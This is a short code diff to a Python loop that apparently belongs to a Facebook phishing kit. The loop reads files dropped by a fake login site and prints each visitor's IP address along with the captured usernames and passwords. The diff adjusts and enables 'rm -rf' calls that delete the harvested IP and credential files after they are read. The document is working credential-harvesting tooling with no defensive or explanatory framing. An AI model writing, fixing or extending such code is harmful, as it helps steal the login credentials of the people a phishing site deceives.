@@ -8,7 +8,7 @@ while True:
 		ip=tr.readline().strip("IP:")
 		print("\n [>] A User Visited the Site From IP : "+ip)
 		tr.close()
-		os.system("rm -rf  /site/facebook/ip.txt")
+		os.system("rm -rf site/facebook/ip.txt")
 	if os.path.isfile("site/facebook/usernames.txt")==True:
 	 #time.sleep(0.75)
 		tr2=open("site/facebook/usernames.txt","r")
@@ -18,4 +18,4 @@ while True:
 		print("\t  user : "+log2[start+9:end])
 		print("\t  Pas  : "+log2[end+5:])
 		tr2.close()
-		#os.system("rm -rf  /site/facebook/usernames.txt")
+		os.system("rm -rf site/facebook/usernames.txt")
